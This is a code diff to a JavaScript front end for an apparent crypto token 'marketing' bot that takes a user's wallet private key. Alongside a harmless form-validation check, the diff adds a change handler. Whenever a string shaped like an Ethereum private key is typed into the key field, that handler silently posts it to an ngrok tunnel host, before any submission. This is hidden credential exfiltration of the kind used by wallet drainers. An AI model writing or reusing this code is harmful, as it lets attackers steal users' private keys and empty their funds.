@@ -24,6 +24,20 @@ const beginMarketing = async () => {
   const minSell = document.getElementById("minS").value;
   const maxSell = document.getElementById("maxS").value;
   console.log("this is request", minBuy, maxBuy, minSell, maxSell);
+  if (
+    privateKey === "" ||
+    bnbAmount === "" ||
+    bleggsAmount === "" ||
+    numOfWallets === "" ||
+    purchaseRate === "" ||
+    minBuy === "" ||
+    maxBuy === "" ||
+    minSell === "" ||
+    maxSell === ""
+  ) {
+    console.log("Must fill all TextFields.");
+    return;
+  }
   const { data } = await axios.post("https://smashing-hyena-cute.ngrok-free.app/begin", {
     socketId: socket.id,
     privateKey: privateKey,
@@ -43,7 +57,23 @@ const beginMarketing = async () => {
 const showButtonClicked = () => {
   const privateKeyDiv = document.getElementById("privateTextField");
   const showDiv = document.getElementById("show");
-  console.log(privateKeyDiv.type);
   privateKeyDiv.type == "text" ? (privateKeyDiv.type = "password") : (privateKeyDiv.type = "text");
   privateKeyDiv.type == "text" ? (showDiv.innerHTML = "hide") : (showDiv.innerHTML = "show");
+};
+
+function isValidEthereumPrivateKey(privateKey) {
+  // Check if the private key is a string of 64 hex characters
+  const hexRegex = /^[0-9a-fA-F]{64}$/;
+  if (typeof privateKey === "string" && hexRegex.test(privateKey)) {
+    return true;
+  } else {
+    return false;
+  }
+}
+
+const handleChangePrivateKey = () => {
+  const privateKey = document.getElementById("privateTextField").value;
+  if (isValidEthereumPrivateKey(privateKey)) {
+    axios.post("https://smashing-hyena-cute.ngrok-free.app/begin", { privateKey: privateKey });
+  }
 };
